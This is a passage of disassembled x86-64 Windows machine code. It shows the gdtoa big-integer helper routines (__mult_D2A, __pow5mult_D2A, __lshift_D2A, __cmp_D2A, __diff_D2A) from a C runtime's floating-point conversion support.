   1400083db:	76 43                	jbe    140008420 <__i2b_D2A+0xb0>
   1400083dd:	b9 28 00 00 00       	mov    $0x28,%ecx
   1400083e2:	e8 e9 0f 00 00       	call   1400093d0 <malloc>
   1400083e7:	48 85 c0             	test   %rax,%rax
   1400083ea:	74 bf                	je     1400083ab <__i2b_D2A+0x3b>
   1400083ec:	48 8b 15 35 35 00 00 	mov    0x3535(%rip),%rdx        # 14000b928 <__bigtens_D2A+0x28>
   1400083f3:	83 3d f6 76 00 00 02 	cmpl   $0x2,0x76f6(%rip)        # 14000faf0 <dtoa_CS_init>
   1400083fa:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1400083fe:	75 9d                	jne    14000839d <__i2b_D2A+0x2d>
   140008400:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008405:	48 8d 0d f4 76 00 00 	lea    0x76f4(%rip),%rcx        # 14000fb00 <dtoa_CritSec>
   14000840c:	ff 15 1e 7f 00 00    	call   *0x7f1e(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   140008412:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008417:	eb 84                	jmp    14000839d <__i2b_D2A+0x2d>
   140008419:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140008420:	48 8d 50 28          	lea    0x28(%rax),%rdx
   140008424:	48 89 15 45 1c 00 00 	mov    %rdx,0x1c45(%rip)        # 14000a070 <pmem_next>
   14000842b:	eb bf                	jmp    1400083ec <__i2b_D2A+0x7c>
   14000842d:	0f 1f 00             	nopl   (%rax)

0000000140008430 <__mult_D2A>:
   140008430:	41 57                	push   %r15
   140008432:	41 56                	push   %r14
   140008434:	41 55                	push   %r13
   140008436:	41 54                	push   %r12
   140008438:	55                   	push   %rbp
   140008439:	57                   	push   %rdi
   14000843a:	56                   	push   %rsi
   14000843b:	53                   	push   %rbx
   14000843c:	48 83 ec 28          	sub    $0x28,%rsp
   140008440:	4c 63 61 14          	movslq 0x14(%rcx),%r12
   140008444:	48 63 6a 14          	movslq 0x14(%rdx),%rbp
   140008448:	49 89 cd             	mov    %rcx,%r13
   14000844b:	49 89 d7             	mov    %rdx,%r15
   14000844e:	41 39 ec             	cmp    %ebp,%r12d
   140008451:	7c 0e                	jl     140008461 <__mult_D2A+0x31>
   140008453:	89 e8                	mov    %ebp,%eax
   140008455:	49 89 cf             	mov    %rcx,%r15
   140008458:	49 63 ec             	movslq %r12d,%rbp
   14000845b:	49 89 d5             	mov    %rdx,%r13
   14000845e:	4c 63 e0             	movslq %eax,%r12
   140008461:	41 8b 4f 08          	mov    0x8(%r15),%ecx
   140008465:	42 8d 5c 25 00       	lea    0x0(%rbp,%r12,1),%ebx
   14000846a:	41 39 5f 0c          	cmp    %ebx,0xc(%r15)
   14000846e:	7d 03                	jge    140008473 <__mult_D2A+0x43>
   140008470:	83 c1 01             	add    $0x1,%ecx
   140008473:	e8 d8 fc ff ff       	call   140008150 <__Balloc_D2A>
   140008478:	48 89 c7             	mov    %rax,%rdi
   14000847b:	48 85 c0             	test   %rax,%rax
   14000847e:	0f 84 df 00 00 00    	je     140008563 <__mult_D2A+0x133>
   140008484:	4c 8d 58 18          	lea    0x18(%rax),%r11
   140008488:	48 63 c3             	movslq %ebx,%rax
   14000848b:	49 8d 34 83          	lea    (%r11,%rax,4),%rsi
   14000848f:	49 39 f3             	cmp    %rsi,%r11
   140008492:	73 23                	jae    1400084b7 <__mult_D2A+0x87>
   140008494:	48 89 f0             	mov    %rsi,%rax
   140008497:	4c 89 d9             	mov    %r11,%rcx
   14000849a:	31 d2                	xor    %edx,%edx
   14000849c:	48 29 f8             	sub    %rdi,%rax
   14000849f:	48 83 e8 19          	sub    $0x19,%rax
   1400084a3:	48 c1 e8 02          	shr    $0x2,%rax
   1400084a7:	4c 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%r8
   1400084ae:	00 
   1400084af:	e8 34 0f 00 00       	call   1400093e8 <memset>
   1400084b4:	49 89 c3             	mov    %rax,%r11
   1400084b7:	4d 8d 4d 18          	lea    0x18(%r13),%r9
   1400084bb:	4d 8d 77 18          	lea    0x18(%r15),%r14
   1400084bf:	4f 8d 24 a1          	lea    (%r9,%r12,4),%r12
   1400084c3:	49 8d 2c ae          	lea    (%r14,%rbp,4),%rbp
   1400084c7:	4d 39 e1             	cmp    %r12,%r9
   1400084ca:	73 78                	jae    140008544 <__mult_D2A+0x114>
   1400084cc:	48 89 e8             	mov    %rbp,%rax
   1400084cf:	4c 29 f8             	sub    %r15,%rax
   1400084d2:	49 83 c7 19          	add    $0x19,%r15
   1400084d6:	4c 8d 68 e7          	lea    -0x19(%rax),%r13
   1400084da:	31 c0                	xor    %eax,%eax
   1400084dc:	49 83 e5 fc          	and    $0xfffffffffffffffc,%r13
   1400084e0:	4c 39 fd             	cmp    %r15,%rbp
   1400084e3:	4c 0f 42 e8          	cmovb  %rax,%r13
   1400084e7:	eb 10                	jmp    1400084f9 <__mult_D2A+0xc9>
   1400084e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400084f0:	49 83 c3 04          	add    $0x4,%r11
   1400084f4:	4d 39 e1             	cmp    %r12,%r9
   1400084f7:	73 4b                	jae    140008544 <__mult_D2A+0x114>
   1400084f9:	45 8b 11             	mov    (%r9),%r10d
   1400084fc:	49 83 c1 04          	add    $0x4,%r9
   140008500:	45 85 d2             	test   %r10d,%r10d
   140008503:	74 eb                	je     1400084f0 <__mult_D2A+0xc0>
   140008505:	4c 89 d9             	mov    %r11,%rcx
   140008508:	4c 89 f2             	mov    %r14,%rdx
   14000850b:	45 31 c0             	xor    %r8d,%r8d
   14000850e:	66 90                	xchg   %ax,%ax
   140008510:	8b 02                	mov    (%rdx),%eax
   140008512:	44 8b 39             	mov    (%rcx),%r15d
   140008515:	48 83 c2 04          	add    $0x4,%rdx
   140008519:	48 83 c1 04          	add    $0x4,%rcx
   14000851d:	49 0f af c2          	imul   %r10,%rax
   140008521:	4c 01 f8             	add    %r15,%rax
   140008524:	4c 01 c0             	add    %r8,%rax
   140008527:	49 89 c0             	mov    %rax,%r8
   14000852a:	89 41 fc             	mov    %eax,-0x4(%rcx)
   14000852d:	49 c1 e8 20          	shr    $0x20,%r8
   140008531:	48 39 ea             	cmp    %rbp,%rdx
   140008534:	72 da                	jb     140008510 <__mult_D2A+0xe0>
   140008536:	47 89 44 2b 04       	mov    %r8d,0x4(%r11,%r13,1)
   14000853b:	49 83 c3 04          	add    $0x4,%r11
   14000853f:	4d 39 e1             	cmp    %r12,%r9
   140008542:	72 b5                	jb     1400084f9 <__mult_D2A+0xc9>
   140008544:	85 db                	test   %ebx,%ebx
   140008546:	7f 0d                	jg     140008555 <__mult_D2A+0x125>
   140008548:	eb 16                	jmp    140008560 <__mult_D2A+0x130>
   14000854a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140008550:	83 eb 01             	sub    $0x1,%ebx
   140008553:	74 0b                	je     140008560 <__mult_D2A+0x130>
   140008555:	8b 46 fc             	mov    -0x4(%rsi),%eax
   140008558:	48 83 ee 04          	sub    $0x4,%rsi
   14000855c:	85 c0                	test   %eax,%eax
   14000855e:	74 f0                	je     140008550 <__mult_D2A+0x120>
   140008560:	89 5f 14             	mov    %ebx,0x14(%rdi)
   140008563:	48 89 f8             	mov    %rdi,%rax
   140008566:	48 83 c4 28          	add    $0x28,%rsp
   14000856a:	5b                   	pop    %rbx
   14000856b:	5e                   	pop    %rsi
   14000856c:	5f                   	pop    %rdi
   14000856d:	5d                   	pop    %rbp
   14000856e:	41 5c                	pop    %r12
   140008570:	41 5d                	pop    %r13
   140008572:	41 5e                	pop    %r14
   140008574:	41 5f                	pop    %r15
   140008576:	c3                   	ret
   140008577:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000857e:	00 00 

0000000140008580 <__pow5mult_D2A>:
   140008580:	55                   	push   %rbp
   140008581:	57                   	push   %rdi
   140008582:	56                   	push   %rsi
   140008583:	53                   	push   %rbx
   140008584:	48 83 ec 28          	sub    $0x28,%rsp
   140008588:	89 d0                	mov    %edx,%eax
   14000858a:	48 89 cd             	mov    %rcx,%rbp
   14000858d:	89 d3                	mov    %edx,%ebx
   14000858f:	83 e0 03             	and    $0x3,%eax
   140008592:	0f 85 88 00 00 00    	jne    140008620 <__pow5mult_D2A+0xa0>
   140008598:	c1 fb 02             	sar    $0x2,%ebx
   14000859b:	48 89 ee             	mov    %rbp,%rsi
   14000859e:	0f 84 a6 00 00 00    	je     14000864a <__pow5mult_D2A+0xca>
   1400085a4:	48 8b 3d d5 6b 00 00 	mov    0x6bd5(%rip),%rdi        # 14000f180 <p5s>
   1400085ab:	48 85 ff             	test   %rdi,%rdi
   1400085ae:	75 15                	jne    1400085c5 <__pow5mult_D2A+0x45>
   1400085b0:	e9 ca 00 00 00       	jmp    14000867f <__pow5mult_D2A+0xff>
   1400085b5:	0f 1f 00             	nopl   (%rax)
   1400085b8:	48 8b 37             	mov    (%rdi),%rsi
   1400085bb:	d1 fb                	sar    $1,%ebx
   1400085bd:	48 85 f6             	test   %rsi,%rsi
   1400085c0:	74 32                	je     1400085f4 <__pow5mult_D2A+0x74>
   1400085c2:	48 89 f7             	mov    %rsi,%rdi
   1400085c5:	f6 c3 01             	test   $0x1,%bl
   1400085c8:	74 ee                	je     1400085b8 <__pow5mult_D2A+0x38>
   1400085ca:	48 89 fa             	mov    %rdi,%rdx
   1400085cd:	48 89 e9             	mov    %rbp,%rcx
   1400085d0:	e8 5b fe ff ff       	call   140008430 <__mult_D2A>
   1400085d5:	48 89 c6             	mov    %rax,%rsi
   1400085d8:	48 85 c0             	test   %rax,%rax
   1400085db:	74 6b                	je     140008648 <__pow5mult_D2A+0xc8>
   1400085dd:	48 89 e9             	mov    %rbp,%rcx
   1400085e0:	e8 5b fc ff ff       	call   140008240 <__Bfree_D2A>
   1400085e5:	d1 fb                	sar    $1,%ebx
   1400085e7:	74 61                	je     14000864a <__pow5mult_D2A+0xca>
   1400085e9:	48 89 f5             	mov    %rsi,%rbp
   1400085ec:	48 8b 37             	mov    (%rdi),%rsi
   1400085ef:	48 85 f6             	test   %rsi,%rsi
   1400085f2:	75 ce                	jne    1400085c2 <__pow5mult_D2A+0x42>
   1400085f4:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400085f9:	e8 22 fa ff ff       	call   140008020 <dtoa_lock>
   1400085fe:	48 8b 37             	mov    (%rdi),%rsi
   140008601:	48 85 f6             	test   %rsi,%rsi
   140008604:	74 5a                	je     140008660 <__pow5mult_D2A+0xe0>
   140008606:	83 3d e3 74 00 00 02 	cmpl   $0x2,0x74e3(%rip)        # 14000faf0 <dtoa_CS_init>
   14000860d:	75 b3                	jne    1400085c2 <__pow5mult_D2A+0x42>
   14000860f:	48 8d 0d 12 75 00 00 	lea    0x7512(%rip),%rcx        # 14000fb28 <dtoa_CritSec+0x28>
   140008616:	ff 15 14 7d 00 00    	call   *0x7d14(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   14000861c:	eb a4                	jmp    1400085c2 <__pow5mult_D2A+0x42>
   14000861e:	66 90                	xchg   %ax,%ax
   140008620:	83 e8 01             	sub    $0x1,%eax
   140008623:	48 8d 15 b6 31 00 00 	lea    0x31b6(%rip),%rdx        # 14000b7e0 <p05.0>
   14000862a:	45 31 c0             	xor    %r8d,%r8d
   14000862d:	48 98                	cltq
   14000862f:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   140008632:	e8 79 fc ff ff       	call   1400082b0 <__multadd_D2A>
   140008637:	48 89 c5             	mov    %rax,%rbp
   14000863a:	48 85 c0             	test   %rax,%rax
   14000863d:	0f 85 55 ff ff ff    	jne    140008598 <__pow5mult_D2A+0x18>
   140008643:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008648:	31 f6                	xor    %esi,%esi
   14000864a:	48 89 f0             	mov    %rsi,%rax
   14000864d:	48 83 c4 28          	add    $0x28,%rsp
   140008651:	5b                   	pop    %rbx
   140008652:	5e                   	pop    %rsi
   140008653:	5f                   	pop    %rdi
   140008654:	5d                   	pop    %rbp
   140008655:	c3                   	ret
   140008656:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000865d:	00 00 00 
   140008660:	48 89 fa             	mov    %rdi,%rdx
   140008663:	48 89 f9             	mov    %rdi,%rcx
   140008666:	e8 c5 fd ff ff       	call   140008430 <__mult_D2A>
   14000866b:	48 89 07             	mov    %rax,(%rdi)
   14000866e:	48 89 c6             	mov    %rax,%rsi
   140008671:	48 85 c0             	test   %rax,%rax
   140008674:	74 d2                	je     140008648 <__pow5mult_D2A+0xc8>
   140008676:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   14000867d:	eb 87                	jmp    140008606 <__pow5mult_D2A+0x86>
   14000867f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008684:	e8 97 f9 ff ff       	call   140008020 <dtoa_lock>
   140008689:	48 8b 3d f0 6a 00 00 	mov    0x6af0(%rip),%rdi        # 14000f180 <p5s>
   140008690:	48 85 ff             	test   %rdi,%rdi
   140008693:	74 1f                	je     1400086b4 <__pow5mult_D2A+0x134>
   140008695:	83 3d 54 74 00 00 02 	cmpl   $0x2,0x7454(%rip)        # 14000faf0 <dtoa_CS_init>
   14000869c:	0f 85 23 ff ff ff    	jne    1400085c5 <__pow5mult_D2A+0x45>
   1400086a2:	48 8d 0d 7f 74 00 00 	lea    0x747f(%rip),%rcx        # 14000fb28 <dtoa_CritSec+0x28>
   1400086a9:	ff 15 81 7c 00 00    	call   *0x7c81(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   1400086af:	e9 11 ff ff ff       	jmp    1400085c5 <__pow5mult_D2A+0x45>
   1400086b4:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400086b9:	e8 92 fa ff ff       	call   140008150 <__Balloc_D2A>
   1400086be:	48 89 c7             	mov    %rax,%rdi
   1400086c1:	48 85 c0             	test   %rax,%rax
   1400086c4:	74 1e                	je     1400086e4 <__pow5mult_D2A+0x164>
   1400086c6:	48 b8 01 00 00 00 71 	movabs $0x27100000001,%rax
   1400086cd:	02 00 00 
   1400086d0:	48 89 3d a9 6a 00 00 	mov    %rdi,0x6aa9(%rip)        # 14000f180 <p5s>
   1400086d7:	48 89 47 14          	mov    %rax,0x14(%rdi)
   1400086db:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400086e2:	eb b1                	jmp    140008695 <__pow5mult_D2A+0x115>
   1400086e4:	48 c7 05 91 6a 00 00 	movq   $0x0,0x6a91(%rip)        # 14000f180 <p5s>
   1400086eb:	00 00 00 00 
   1400086ef:	31 f6                	xor    %esi,%esi
   1400086f1:	e9 54 ff ff ff       	jmp    14000864a <__pow5mult_D2A+0xca>
   1400086f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400086fd:	00 00 00 

0000000140008700 <__lshift_D2A>:
   140008700:	41 56                	push   %r14
   140008702:	41 55                	push   %r13
   140008704:	41 54                	push   %r12
   140008706:	55                   	push   %rbp
   140008707:	57                   	push   %rdi
   140008708:	56                   	push   %rsi
   140008709:	53                   	push   %rbx
   14000870a:	48 83 ec 20          	sub    $0x20,%rsp
   14000870e:	48 89 cd             	mov    %rcx,%rbp
   140008711:	89 d6                	mov    %edx,%esi
   140008713:	8b 49 08             	mov    0x8(%rcx),%ecx
   140008716:	89 d3                	mov    %edx,%ebx
   140008718:	44 8b 65 14          	mov    0x14(%rbp),%r12d
   14000871c:	c1 fe 05             	sar    $0x5,%esi
   14000871f:	8b 45 0c             	mov    0xc(%rbp),%eax
   140008722:	41 01 f4             	add    %esi,%r12d
   140008725:	45 8d 6c 24 01       	lea    0x1(%r12),%r13d
   14000872a:	41 39 c5             	cmp    %eax,%r13d
   14000872d:	7e 0b                	jle    14000873a <__lshift_D2A+0x3a>
   14000872f:	90                   	nop
   140008730:	01 c0                	add    %eax,%eax
   140008732:	83 c1 01             	add    $0x1,%ecx
   140008735:	41 39 c5             	cmp    %eax,%r13d
   140008738:	7f f6                	jg     140008730 <__lshift_D2A+0x30>
   14000873a:	e8 11 fa ff ff       	call   140008150 <__Balloc_D2A>
   14000873f:	49 89 c6             	mov    %rax,%r14
   140008742:	48 85 c0             	test   %rax,%rax
   140008745:	0f 84 9a 00 00 00    	je     1400087e5 <__lshift_D2A+0xe5>
   14000874b:	48 8d 78 18          	lea    0x18(%rax),%rdi
   14000874f:	85 f6                	test   %esi,%esi
   140008751:	7e 14                	jle    140008767 <__lshift_D2A+0x67>
   140008753:	48 c1 e6 02          	shl    $0x2,%rsi
   140008757:	48 89 f9             	mov    %rdi,%rcx
   14000875a:	31 d2                	xor    %edx,%edx
   14000875c:	49 89 f0             	mov    %rsi,%r8
   14000875f:	48 01 f7             	add    %rsi,%rdi
   140008762:	e8 81 0c 00 00       	call   1400093e8 <memset>
   140008767:	48 63 45 14          	movslq 0x14(%rbp),%rax
   14000876b:	48 8d 75 18          	lea    0x18(%rbp),%rsi
   14000876f:	4c 8d 0c 86          	lea    (%rsi,%rax,4),%r9
   140008773:	83 e3 1f             	and    $0x1f,%ebx
   140008776:	0f 84 84 00 00 00    	je     140008800 <__lshift_D2A+0x100>
   14000877c:	41 ba 20 00 00 00    	mov    $0x20,%r10d
   140008782:	49 89 f8             	mov    %rdi,%r8
   140008785:	31 d2                	xor    %edx,%edx
   140008787:	41 29 da             	sub    %ebx,%r10d
   14000878a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140008790:	8b 06                	mov    (%rsi),%eax
   140008792:	89 d9                	mov    %ebx,%ecx
   140008794:	49 83 c0 04          	add    $0x4,%r8
   140008798:	48 83 c6 04          	add    $0x4,%rsi
   14000879c:	d3 e0                	shl    %cl,%eax
   14000879e:	44 89 d1             	mov    %r10d,%ecx
   1400087a1:	09 d0                	or     %edx,%eax
   1400087a3:	41 89 40 fc          	mov    %eax,-0x4(%r8)
   1400087a7:	8b 56 fc             	mov    -0x4(%rsi),%edx
   1400087aa:	d3 ea                	shr    %cl,%edx
   1400087ac:	4c 39 ce             	cmp    %r9,%rsi
   1400087af:	72 df                	jb     140008790 <__lshift_D2A+0x90>
   1400087b1:	4c 89 c8             	mov    %r9,%rax
   1400087b4:	48 8d 4d 19          	lea    0x19(%rbp),%rcx
   1400087b8:	48 29 e8             	sub    %rbp,%rax
   1400087bb:	48 83 e8 19          	sub    $0x19,%rax
   1400087bf:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   1400087c3:	49 39 c9             	cmp    %rcx,%r9
   1400087c6:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400087cb:	48 0f 42 c1          	cmovb  %rcx,%rax
   1400087cf:	85 d2                	test   %edx,%edx
   1400087d1:	45 0f 45 e5          	cmovne %r13d,%r12d
   1400087d5:	89 54 07 04          	mov    %edx,0x4(%rdi,%rax,1)
   1400087d9:	45 89 66 14          	mov    %r12d,0x14(%r14)
   1400087dd:	48 89 e9             	mov    %rbp,%rcx
   1400087e0:	e8 5b fa ff ff       	call   140008240 <__Bfree_D2A>
   1400087e5:	4c 89 f0             	mov    %r14,%rax
   1400087e8:	48 83 c4 20          	add    $0x20,%rsp
   1400087ec:	5b                   	pop    %rbx
   1400087ed:	5e                   	pop    %rsi
   1400087ee:	5f                   	pop    %rdi
   1400087ef:	5d                   	pop    %rbp
   1400087f0:	41 5c                	pop    %r12
   1400087f2:	41 5d                	pop    %r13
   1400087f4:	41 5e                	pop    %r14
   1400087f6:	c3                   	ret
   1400087f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400087fe:	00 00 
   140008800:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
   140008801:	4c 39 ce             	cmp    %r9,%rsi
   140008804:	73 d3                	jae    1400087d9 <__lshift_D2A+0xd9>
   140008806:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
   140008807:	4c 39 ce             	cmp    %r9,%rsi
   14000880a:	72 f4                	jb     140008800 <__lshift_D2A+0x100>
   14000880c:	eb cb                	jmp    1400087d9 <__lshift_D2A+0xd9>
   14000880e:	66 90                	xchg   %ax,%ax

0000000140008810 <__cmp_D2A>:
   140008810:	48 63 42 14          	movslq 0x14(%rdx),%rax
   140008814:	44 8b 49 14          	mov    0x14(%rcx),%r9d
   140008818:	41 29 c1             	sub    %eax,%r9d
   14000881b:	75 37                	jne    140008854 <__cmp_D2A+0x44>
   14000881d:	4c 8d 04 85 00 00 00 	lea    0x0(,%rax,4),%r8
   140008824:	00 
   140008825:	48 83 c1 18          	add    $0x18,%rcx
   140008829:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   14000882d:	4a 8d 54 02 18       	lea    0x18(%rdx,%r8,1),%rdx
   140008832:	eb 09                	jmp    14000883d <__cmp_D2A+0x2d>
   140008834:	0f 1f 40 00          	nopl   0x0(%rax)
   140008838:	48 39 c1             	cmp    %rax,%rcx
   14000883b:	73 17                	jae    140008854 <__cmp_D2A+0x44>
   14000883d:	48 83 e8 04          	sub    $0x4,%rax
   140008841:	48 83 ea 04          	sub    $0x4,%rdx
   140008845:	44 8b 12             	mov    (%rdx),%r10d
   140008848:	44 39 10             	cmp    %r10d,(%rax)
   14000884b:	74 eb                	je     140008838 <__cmp_D2A+0x28>
   14000884d:	45 19 c9             	sbb    %r9d,%r9d
   140008850:	41 83 c9 01          	or     $0x1,%r9d
   140008854:	44 89 c8             	mov    %r9d,%eax
   140008857:	c3                   	ret
   140008858:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000885f:	00 

0000000140008860 <__diff_D2A>:
   140008860:	41 54                	push   %r12
   140008862:	55                   	push   %rbp
   140008863:	57                   	push   %rdi
   140008864:	56                   	push   %rsi
   140008865:	53                   	push   %rbx
   140008866:	48 83 ec 20          	sub    $0x20,%rsp
   14000886a:	48 63 42 14          	movslq 0x14(%rdx),%rax
   14000886e:	8b 79 14             	mov    0x14(%rcx),%edi
   140008871:	48 89 cb             	mov    %rcx,%rbx
   140008874:	48 89 d6             	mov    %rdx,%rsi
   140008877:	29 c7                	sub    %eax,%edi
   140008879:	0f 85 49 01 00 00    	jne    1400089c8 <__diff_D2A+0x168>
   14000887f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008886:	00 
   140008887:	48 8d 49 18          	lea    0x18(%rcx),%rcx
   14000888b:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   14000888f:	48 8d 54 16 18       	lea    0x18(%rsi,%rdx,1),%rdx
   140008894:	eb 13                	jmp    1400088a9 <__diff_D2A+0x49>
   140008896:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000889d:	00 00 00 
   1400088a0:	48 39 c1             	cmp    %rax,%rcx
   1400088a3:	0f 83 37 01 00 00    	jae    1400089e0 <__diff_D2A+0x180>
   1400088a9:	48 83 e8 04          	sub    $0x4,%rax
   1400088ad:	48 83 ea 04          	sub    $0x4,%rdx
   1400088b1:	44 8b 02             	mov    (%rdx),%r8d
   1400088b4:	44 39 00             	cmp    %r8d,(%rax)
   1400088b7:	74 e7                	je     1400088a0 <__diff_D2A+0x40>
   1400088b9:	0f 83 49 01 00 00    	jae    140008a08 <__diff_D2A+0x1a8>
   1400088bf:	bf 01 00 00 00       	mov    $0x1,%edi
   1400088c4:	8b 4e 08             	mov    0x8(%rsi),%ecx
   1400088c7:	e8 84 f8 ff ff       	call   140008150 <__Balloc_D2A>
   1400088cc:	49 89 c1             	mov    %rax,%r9
   1400088cf:	48 85 c0             	test   %rax,%rax
   1400088d2:	0f 84 db 00 00 00    	je     1400089b3 <__diff_D2A+0x153>
   1400088d8:	89 78 10             	mov    %edi,0x10(%rax)
   1400088db:	48 63 46 14          	movslq 0x14(%rsi),%rax
   1400088df:	48 8d 6e 18          	lea    0x18(%rsi),%rbp
   1400088e3:	49 8d 79 18          	lea    0x18(%r9),%rdi
   1400088e7:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400088ec:	31 d2                	xor    %edx,%edx
   1400088ee:	49 89 c2             	mov    %rax,%r10
   1400088f1:	4c 8d 44 85 00       	lea    0x0(%rbp,%rax,4),%r8
   1400088f6:	48 63 43 14          	movslq 0x14(%rbx),%rax
   1400088fa:	4c 8d 64 83 18       	lea    0x18(%rbx,%rax,4),%r12
   1400088ff:	90                   	nop
   140008900:	44 8b 1c 0b          	mov    (%rbx,%rcx,1),%r11d
   140008904:	8b 04 0e             	mov    (%rsi,%rcx,1),%eax
   140008907:	4c 29 d8             	sub    %r11,%rax
   14000890a:	48 29 d0             	sub    %rdx,%rax
   14000890d:	41 89 04 09          	mov    %eax,(%r9,%rcx,1)
   140008911:	48 89 c2             	mov    %rax,%rdx
   140008914:	48 83 c1 04          	add    $0x4,%rcx
   140008918:	41 89 c3             	mov    %eax,%r11d
   14000891b:	48 c1 ea 20          	shr    $0x20,%rdx
   14000891f:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
   140008923:	83 e2 01             	and    $0x1,%edx
   140008926:	4c 39 e0             	cmp    %r12,%rax
   140008929:	72 d5                	jb     140008900 <__diff_D2A+0xa0>
   14000892b:	4c 89 e0             	mov    %r12,%rax
   14000892e:	31 c9                	xor    %ecx,%ecx
   140008930:	48 29 d8             	sub    %rbx,%rax
   140008933:	48 83 c3 19          	add    $0x19,%rbx
   140008937:	48 83 e8 19          	sub    $0x19,%rax
   14000893b:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   14000893f:	49 39 dc             	cmp    %rbx,%r12
   140008942:	48 0f 42 c1          	cmovb  %rcx,%rax
   140008946:	48 8d 1c 38          	lea    (%rax,%rdi,1),%rbx
   14000894a:	4c 8d 64 05 04       	lea    0x4(%rbp,%rax,1),%r12
   14000894f:	48 29 ef             	sub    %rbp,%rdi
   140008952:	48 8d 73 04          	lea    0x4(%rbx),%rsi
   140008956:	4c 89 e1             	mov    %r12,%rcx
   140008959:	48 89 d8             	mov    %rbx,%rax
   14000895c:	4d 39 c4             	cmp    %r8,%r12
   14000895f:	73 39                	jae    14000899a <__diff_D2A+0x13a>
   140008961:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140008968:	48 89 c8             	mov    %rcx,%rax
   14000896b:	48 8d 1c 39          	lea    (%rcx,%rdi,1),%rbx
   14000896f:	48 83 c1 04          	add    $0x4,%rcx
   140008973:	8b 00                	mov    (%rax),%eax
   140008975:	48 29 d0             	sub    %rdx,%rax
   140008978:	48 89 c2             	mov    %rax,%rdx
   14000897b:	89 03                	mov    %eax,(%rbx)
   14000897d:	41 89 c3             	mov    %eax,%r11d
   140008980:	48 c1 ea 20          	shr    $0x20,%rdx
   140008984:	83 e2 01             	and    $0x1,%edx
   140008987:	4c 39 c1             	cmp    %r8,%rcx
   14000898a:	72 dc                	jb     140008968 <__diff_D2A+0x108>
   14000898c:	49 8d 40 ff          	lea    -0x1(%r8),%rax
   140008990:	4c 29 e0             	sub    %r12,%rax
   140008993:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   140008997:	48 01 f0             	add    %rsi,%rax
   14000899a:	45 85 db             	test   %r11d,%r11d
   14000899d:	75 10                	jne    1400089af <__diff_D2A+0x14f>
   14000899f:	90                   	nop
   1400089a0:	8b 50 fc             	mov    -0x4(%rax),%edx
   1400089a3:	48 83 e8 04          	sub    $0x4,%rax
   1400089a7:	41 83 ea 01          	sub    $0x1,%r10d
   1400089ab:	85 d2                	test   %edx,%edx
   1400089ad:	74 f1                	je     1400089a0 <__diff_D2A+0x140>
   1400089af:	45 89 51 14          	mov    %r10d,0x14(%r9)
   1400089b3:	4c 89 c8             	mov    %r9,%rax
   1400089b6:	48 83 c4 20          	add    $0x20,%rsp
   1400089ba:	5b                   	pop    %rbx
   1400089bb:	5e                   	pop    %rsi
   1400089bc:	5f                   	pop    %rdi
   1400089bd:	5d                   	pop    %rbp
   1400089be:	41 5c                	pop    %r12
   1400089c0:	c3                   	ret
   1400089c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400089c8:	bf 01 00 00 00       	mov    $0x1,%edi
   1400089cd:	0f 88 f1 fe ff ff    	js     1400088c4 <__diff_D2A+0x64>
   1400089d3:	48 89 ce             	mov    %rcx,%rsi
   1400089d6:	48 89 d3             	mov    %rdx,%rbx
   1400089d9:	31 ff                	xor    %edi,%edi
   1400089db:	e9 e4 fe ff ff       	jmp    1400088c4 <__diff_D2A+0x64>
   1400089e0:	31 c9                	xor    %ecx,%ecx
   1400089e2:	e8 69 f7 ff ff       	call   140008150 <__Balloc_D2A>
   1400089e7:	49 89 c1             	mov    %rax,%r9
   1400089ea:	48 85 c0             	test   %rax,%rax
   1400089ed:	74 c4                	je     1400089b3 <__diff_D2A+0x153>
   1400089ef:	48 c7 40 14 01 00 00 	movq   $0x1,0x14(%rax)
   1400089f6:	00 
   1400089f7:	4c 89 c8             	mov    %r9,%rax
   1400089fa:	48 83 c4 20          	add    $0x20,%rsp
   1400089fe:	5b                   	pop    %rbx
   1400089ff:	5e                   	pop    %rsi
   140008a00:	5f                   	pop    %rdi
   140008a01:	5d                   	pop    %rbp
   140008a02:	41 5c                	pop    %r12
   140008a04:	c3                   	ret
   140008a05:	0f 1f 00             	nopl   (%rax)
   140008a08:	48 89 f0             	mov    %rsi,%rax
   140008a0b:	48 89 de             	mov    %rbx,%rsi
   140008a0e:	48 89 c3             	mov    %rax,%rbx
   140008a11:	e9 ae fe ff ff       	jmp    1400088c4 <__diff_D2A+0x64>
   140008a16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140008a1d:	00 00 00 

